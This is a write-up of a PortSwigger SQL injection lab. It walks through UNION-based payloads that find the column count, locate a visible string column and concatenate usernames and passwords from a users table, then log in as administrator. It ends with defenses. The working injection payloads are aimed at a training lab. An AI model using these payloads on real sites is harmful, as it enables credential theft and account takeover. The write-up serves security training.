# 📘 PortSwigger Lab: SQL injection UNION attack, retrieving multiple values in a single column

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-single-column

---

# 📑 Table of Contents

- [🎯 Goal](#goal)
- [🧠 Attack idea](#idea)
- [🏗 What is already known](#how)
- [🔍 Step 1 — Determine column count](#step1)
- [🔍 Step 2 — Find string column](#step2)
- [🔍 Step 3 — Concatenation](#step3)
- [🔍 Step 4 — Retrieve credentials](#step4)
- [🔍 Step 5 — Login as administrator](#step5)
- [💥 Why the attack worked](#why)
- [🛡 Defense](#defense)
- [🛠 Checklist](#checklist)

---

<a id="goal"></a>

# 🎯 Goal

Retrieve usernames and passwords from the `users` table using a single column and log in as `administrator`.

---

<a id="idea"></a>

# 🧠 Attack idea

Sometimes only one visible column exists.

In this case:
- username;
- password;

must be combined into a single string.

---

# Example

```text
administrator~secret123
```

---

<a id="how"></a>

# 🏗 What is already known

The lab already provides:

```text
table = users
columns = username,password
```

We need to:
1. determine the number of columns;
2. find a visible string column;
3. combine username/password using concatenation.

---

<a id="step1"></a>

# 🔍 Step 1 — Determine column count

```sql
UNION SELECT NULL--
```

❌ Error

```sql
UNION SELECT NULL,NULL--
```

✅ Success

---

# Conclusion

The original SELECT query contains:
# 2 columns

---

<a id="step2"></a>

# 🔍 Step 2 — Find string column

```http
/filter?category=Accessories' UNION SELECT NULL,'test'--
```

✅ String visible on page

---

# Conclusion

The second column is:
- string-compatible;
- visible.

---

<a id="step3"></a>

# 🔍 Step 3 — Concatenation

Payload:

```http
/filter?category=Accessories' UNION SELECT NULL,username || '~' || password FROM users--
```

---

# What does || do

Concatenates strings.

---

# What does ~ do

Separates:
- username;
- password.

---

<a id="step4"></a>

# 🔍 Step 4 — Retrieve credentials

The application displayed:

```text
administrator~secret123
carlos~montoya
```

and other user credentials.

---

<a id="step5"></a>

# 🔍 Step 5 — Login as administrator

Open:

```text
/login
```

Use:
- username = administrator
- password = extracted password

---

# Result

Successful login to the administrator account.

The lab was solved.

---

<a id="why"></a>

# 💥 Why the attack worked

Because the application:
- inserted user input directly into SQL;
- did not use prepared statements;
- displayed SQL results to the user.

---

<a id="defense"></a>

# 🛡 Defense

- Prepared Statements
- Parameterized Queries
- Input Validation
- Least Privilege
- WAF

Safe example:

```php
$stmt = $pdo->prepare("SELECT * FROM products WHERE category=?");
```

---

<a id="checklist"></a>

# 🛠 Checklist

- [ ] SQL Injection identified
- [ ] column count determined
- [ ] visible string column identified
- [ ] concatenation performed
- [ ] usernames/passwords retrieved
- [ ] login as administrator completed

---

# ⬆ Back to top

[Return to top](#top)
